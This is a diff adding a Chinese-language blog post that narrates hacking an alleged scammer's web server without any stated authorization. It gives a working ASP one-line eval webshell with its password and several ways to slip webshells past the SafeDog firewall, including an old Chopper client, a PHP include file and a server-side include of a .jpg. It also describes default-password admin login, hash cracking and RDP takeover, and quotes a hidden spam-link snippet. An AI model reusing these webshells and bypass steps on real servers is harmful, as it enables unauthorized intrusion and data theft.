@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>日一骗子站，最新大小马突破安全狗并提权 | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+
+<main class="content" role="main">
+  <article class="post">
+    <span class="post-meta">
+      <time datetime="2012-11-01T03:28:08.000Z" itemprop="datePublished">
+          2012-11-01
+      </time>
+    
+    
+    | 
+    <a href='/tag/突破安全狗/'>突破安全狗</a>
+    
+    
+</span>
+    <h1 class="post-title">日一骗子站，最新大小马突破安全狗并提权</h1>
+    <section class="post-content">
+      <p>作者：老树</p>  <p><b>起因：</b><b></b></p>  <p>有一朋友在网上购买了一台手机，等了十多天也没有收到货，才发现被骗了，于是有了下文。</p>  <p><b>过程：</b><b></b></p>  <p>头晕晕的，文笔不好，因为服务器关了，图就没了，大家将就着看，不喜欢的勿扰。谢谢！</p>  <p>用wvs扫了一下目录，发现了是ewebeditor，用默认密码admin888进入了后台，拿shell就不说了，样式添加asa拿到了shell，这个简单就不说了。</p>  <p>用菜刀连接不了，上传大马也不行。。。</p>  <p>换了一个过安全狗的一句话，&lt;%Y=request(&quot;si&quot;)%&gt; &lt;%eval(Y)%&gt; 密码：si</p>  <p>用菜刀还是不能连接，可能是菜刀传递参数的时候，某些函数被杀了，导致不能连接。我们直接在浏览器上打开显示是正常解析一句话的。</p>  <p>想起以前的D盾对国外的shell不敏感，有了思路，记得菜刀进行了几次大的更新，换成以前的老版本菜刀，果断连接上……</p>  <p>结果，安全狗只杀最新的菜刀，如果你用以前的老版本照样可以连接一句话。</p>  <p>如图：</p>  <p>传了大马上去想提权，发现又被安全狗禁止了</p>  <p>在28号的看了一篇“一次以外<a href="http://ha.cker.in/tag/突破安全狗" target="_blank">突破安全狗</a>拿shell”，用两个;x.asp;x.jpg绕过狗，其实这方法新版狗早就不行了，也许LZ运气好，遇到的是没升级的安全狗。</p>  <p>也看了一篇PHP包含文件<a href="http://ha.cker.in/tag/突破安全狗" target="_blank">突破安全狗</a>的，代码如下：</p>  <pre><span style="color: #0000ff">&lt;?</span>php<br><br><a style="color: #0000ff" href="http://www.php.net/require_once" target="_blank" rel="external">require_once</a>(&quot;<span style="color: #8b0000">dama.txt</span>&quot;);<br><br><span style="color: #0000ff">?&gt;</span> </pre><br><br><p>把你的大马php改成dama.txt</p>
+
+<p>注：require_once() 语句在脚本执行期间包含并运行指定文件。</p>
+
+<p>这方法也被狗杀了。。。</p>
+
+<p>想起了以前服务器有网站中毒，找了很久也没找到木马，用狗，用护卫神都没查到，没办法，就只能一步一步的调试找出木马了，方法是删掉一段代码再运行，看还有没有木马，记得很早以前免杀shell就这样搞的，苦逼。。。</p>
+
+<p>一分为二，发现有一段被杀，看了下代码，非常可疑，代码如下：</p>
+
+<pre><span style="color: #008000">&lt;!-- #include file
+
+=&quot;images\virtucm.jpg&quot; --&gt;</span>
+
+virtucm.jpg里的内容：
+
+<span style="color: #0000ff">&lt;</span><span style="color: #800000">script</span> <span style="color: #ff0000">language</span>=<span style="color: #0000ff">&quot;javascript&quot;</span> <span style="color: #ff0000">type</span>=<span style="color: #0000ff">&quot;text/javascript&quot;</span><span style="color: #0000ff">&gt;</span>document.write
+
+(&quot;<span style="color: #0000ff">&lt;</span><span style="color: #800000">marquee</span> <span style="color: #ff0000">scrollAmount</span>=<span style="color: #0000ff">1000</span> <span style="color: #ff0000">width</span>=<span style="color: #0000ff">'1'</span> <span style="color: #ff0000">height</span>=<span style="color: #0000ff">'5'</span><span style="color: #0000ff">&gt;</span>&quot;);<span style="color: #0000ff">&lt;/</span><span style="color: #800000">script</span><span style="color: #0000ff">&gt;</span>
+
+<span style="color: #0000ff">&lt;</span><span style="color: #800000">div</span><span style="color: #0000ff">&gt;</span>友情链接：
+
+<span style="color: #0000ff">&lt;</span><span style="color: #800000">a</span> <span style="color: #ff0000">href</span>=<span style="color: #0000ff">&quot;http://www.198bet.com/&quot;</span><span style="color: #0000ff">&gt;</span>bet365娱乐场<span style="color: #0000ff">&lt;/</span><span style="color: #800000">a</span><span style="color: #0000ff">&gt;</span>
+
+<span style="color: #0000ff">&lt;/</span><span style="color: #800000">div</span><span style="color: #0000ff">&gt;</span>
+
+<span style="color: #0000ff">&lt;</span><span style="color: #800000">script</span> <span style="color: #ff0000">language</span>=<span style="color: #0000ff">&quot;javascript&quot;</span> <span style="color: #ff0000">type</span>=<span style="color: #0000ff">&quot;text/javascript&quot;</span><span style="color: #0000ff">&gt;</span>document.write
+
+(&quot;<span style="color: #0000ff">&lt;/</span><span style="color: #800000">marquee</span><span style="color: #0000ff">&gt;</span>&quot;);<span style="color: #0000ff">&lt;/</span><span style="color: #800000">script</span><span style="color: #0000ff">&gt;</span></pre>
+
+<p>传说中的黑帽SEO，隐蔽性、迷惑性超强。。。</p>
+
+<p>把那段代码随便放到一个asp文件里面，把virtucm.jpg里的内容改成你的大马，突破安全狗。</p>
+
+<p>进入shell，找了下可写目录，上传了一个cmd，发现运行命令没回显，看了下用户的桌面，发现一个txt文件，里面有root的账号密码，马上扫了一下端口，发现只开了80，和3389，不能mysql提权了。</p>
+
+<p>打开远程，看有没有前人留下的shift后门，结果没有</p>
+
+<p>翻了翻目录，没发现可以利用的地方，真操蛋</p>
+
+<p>后来在wscript里运行了一下net user，发现能直接列用户，一看权限是system权限，不知谁把asp.dll提升权限了，直接抓了hash破了管理员密码。</p>
+
+<p>果断用管理员登录远程，结果刚登上去，就被踢下来了，原来那骗子天天关注服务器，难怪我的一句话刚上传没多久，就被狗拒绝了，原来是他加入了黑名单。。</p>
+
+<p><b>结果：</b><b></b></p>
+
+<p>后来，这骗子发现有人搞他服务器，他就直接把服务器关了，域名也直接停止解析，事情告一段落。</p>
+
+<p>思路很重要，基础别忘了，有时经验可以让自己少走很多路。</p>
+
+<p>就像拿到后台多试试几个默认密码，windows oday提权前先运行systeminfo看下打了什么补丁，不要盲目的拿着oday就上，看看远程有没有前人留下的shift后门，翻一翻system32里面有没有前人留下的记录管理员密码……</p>
+
+<p>还有一句友情提醒，网络有风险，购物请慎重。</p>
+    </section>
+    <footer class="post-footer">
+      <section class="author">
+    <h4>Secer</h4>
+    <p>记录互联网安全历程与个人成长经历</p>
+</section>
+      <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/919.seo/" target="_blank">
+        <span class="hidden">weibo</span>
+    </a>
+    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/919.seo/"
+       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/919.seo/"
+       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/919.seo/"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+
+    </footer>
+  </article>
+  <nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="/920.seo/">
+        ← PHP提高编程效率的方法
+    </a>
+    
+    <span class="icon-logo">•</span>
+    
+    <a class="older-posts" href="/918.seo/">
+        php实现多服务器共享session的方法 →
+    </a>
+    
+</nav>
+
+  <div id="comment" class="comments-area">
+    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
+    
+</div>
+
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
